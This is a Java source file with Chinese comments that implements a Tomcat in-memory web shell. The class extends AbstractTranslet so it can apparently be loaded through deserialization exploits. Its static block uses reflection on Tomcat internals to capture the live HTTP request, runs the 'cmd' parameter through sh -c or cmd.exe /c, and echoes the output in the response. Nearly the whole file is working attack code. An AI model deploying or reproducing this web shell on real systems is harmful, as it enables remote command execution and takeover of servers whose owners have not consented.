package org.example.tomcatmemshell.Generic;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.connector.Response;
import org.apache.catalina.connector.ResponseFacade;
import org.apache.catalina.core.ApplicationFilterChain;

import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import java.util.Scanner;

//1. 反射修改`ApplicationDispatcher.WRAP_SAME_OBJECT`为true，此时lastServicedRequest和lastServicedResponse有了值
//
//2. 由于已经反射修改了`WRAP_SAME_OBJECT`，而if内的set是调用ThreadLocal.set()，肯定得先初始化lastServicedRequest和lastServicedResponse。
//Tomcat 7,8,9,不适用shiro
public class GenericTomcatMemShell extends AbstractTranslet {
    static {
        try{
            Field WRAP_SAME_OBJECT_FIELD = Class.forName("org.apache.catalina.core.ApplicationDispatcher").getDeclaredField("WRAP_SAME_OBJECT");//以下几行为反射修改private static final变量的流程
            Field lastServicedRequestField = ApplicationFilterChain.class.getDeclaredField("lastServicedRequest");
            Field lastServicedResponseField = ApplicationFilterChain.class.getDeclaredField("lastServicedResponse");
            Field modifiersField = Field.class.getDeclaredField("modifiers");
            modifiersField.setAccessible(true);
            modifiersField.setInt(WRAP_SAME_OBJECT_FIELD, WRAP_SAME_OBJECT_FIELD.getModifiers() & ~Modifier.FINAL);
            modifiersField.setInt(lastServicedRequestField, lastServicedRequestField.getModifiers() & ~Modifier.FINAL);
            modifiersField.setInt(lastServicedResponseField, lastServicedResponseField.getModifiers() & ~Modifier.FINAL);
            WRAP_SAME_OBJECT_FIELD.setAccessible(true);
            lastServicedRequestField.setAccessible(true);
            lastServicedResponseField.setAccessible(true);

            ThreadLocal<ServletResponse> lastServicedResponse =
                    (ThreadLocal<ServletResponse>) lastServicedResponseField.get(null);//获取实例
            ThreadLocal<ServletRequest> lastServicedRequest = (ThreadLocal<ServletRequest>) lastServicedRequestField.get(null);//同上
            boolean WRAP_SAME_OBJECT = WRAP_SAME_OBJECT_FIELD.getBoolean(null);//同上
            String cmd = lastServicedRequest != null
                    ? lastServicedRequest.get().getParameter("cmd")
                    : null;//获取cmd参数的值
            if (!WRAP_SAME_OBJECT || lastServicedResponse == null || lastServicedRequest == null) {
                lastServicedRequestField.set(null, new ThreadLocal<>());//赋值
                lastServicedResponseField.set(null, new ThreadLocal<>());//赋值
                WRAP_SAME_OBJECT_FIELD.setBoolean(null, true);//赋值
            } else if (cmd != null) {//回显内容
                ServletResponse responseFacade = lastServicedResponse.get();//获取当前请求response
                java.io.Writer w = responseFacade.getWriter();

                Field responseField = ResponseFacade.class.getDeclaredField("response");//修改usingwriter，让页面可以写正常内容以及命令回显
                responseField.setAccessible(true);
                Response response = (Response) responseField.get(responseFacade);
                Field usingWriter = org.apache.catalina.connector.Response.class.getDeclaredField("usingWriter");
                usingWriter.setAccessible(true);
                usingWriter.set(response, Boolean.FALSE);

                boolean isLinux = true;//执行命令
                String osTyp = System.getProperty("os.name");
                if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                    isLinux = false;
                }
                String[] cmds = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
                InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                Scanner s = new Scanner(in).useDelimiter("\\a");
                String output = s.hasNext() ? s.next() : "";
                w.write(output);
                w.flush();
            }
        } catch (IOException e) {
            throw new RuntimeException(e);
        } catch (NoSuchFieldException e) {
            throw new RuntimeException(e);
        } catch (ClassNotFoundException e) {
            throw new RuntimeException(e);
        } catch (IllegalAccessException e) {
            throw new RuntimeException(e);
        }
    }
    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
